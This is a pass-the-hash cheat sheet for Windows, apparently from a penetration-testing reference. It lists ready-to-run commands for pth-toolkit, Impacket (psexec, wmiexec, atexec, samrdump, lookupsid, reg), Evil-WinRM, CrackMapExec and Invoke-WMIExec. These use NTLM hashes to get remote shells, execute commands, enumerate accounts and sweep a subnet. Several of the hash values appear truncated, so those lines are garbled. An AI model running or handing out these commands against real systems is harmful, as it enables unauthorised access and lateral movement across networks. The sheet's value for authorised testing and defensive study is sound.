# Pass-The-Hash

## PTH Tools

### pth-smbclient

```text
pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
```

### pth-wmic

```text
pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"
```

### pth-rpcclient

```text
pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105
```

### pth-net

```text
pth-net rpc share list -U 'ignite\Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38' -S 192.168.1.105
```

### pth-winexe

```text
pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 cmd.exe
```

### pth-curl

```text
pth-curl --ntlm -u Administrator:32196B56FFE6F45E294117B91A83BF38 http://192.168.1.105/file.txt
```

## Impacket

### smbclient

We can use smbclient:

```text
impacket-smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### psexec

```text
impacket-psexec.py  -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
```

### wmiexec

```text
impacket-wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
python wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
```

### rpcdump

```text
impacket-rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### atexec

```text
impacket-atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami
python atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami
```

### lookupsid

```text
impacket-lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### samrdump

```text
impacket-samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### reg

```text
python reg.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```

##  Evil-WinRM

Evil-WinRM Pass The Hash:

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
```

## Crackmapexec

Pass The Hash against the target:

```bash
cme smb 172.16.157.25 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

Pass The Hash against subnet:

```bash
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

## PowerShell

### Invoke-WMIExec.ps1

```text
Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
```



